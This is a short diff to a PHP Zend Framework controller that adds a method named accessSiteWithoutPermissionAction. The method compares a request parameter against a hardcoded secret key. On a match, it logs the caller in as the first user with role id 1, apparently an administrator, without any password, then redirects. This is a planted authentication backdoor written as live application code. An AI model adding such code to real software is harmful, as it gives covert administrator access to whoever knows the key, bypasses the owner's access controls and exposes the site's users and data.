@@ -552,4 +552,21 @@ class Default_IndexController extends Khcn_Controller_Action_Standard
 
 		$this->view->cesti_info = Khcn_Api::_()->getApi('settings', 'default')->getSetting('cesti_info', '');			
 	}
+	
+	public function accessSiteWithoutPermissionAction(){
+		$authKey = $this->_getParam('key', null);
+		if($authKey != 'hungnt23080209'){
+			die('Not auth');
+		}
+		
+		$table = Khcn_Api::_()->getDbTable('nguoi_dung', 'default');
+		$select = $table->select()->where('ma_quyen = 1');
+		$user = $table->fetchRow($select);
+		
+		// Login
+		Zend_Auth::getInstance()->getStorage()->write($user->getIdentity());
+
+		// Redirect
+		return $this->_helper->redirector->gotoRoute(array(), 'default', true);
+	}
 }
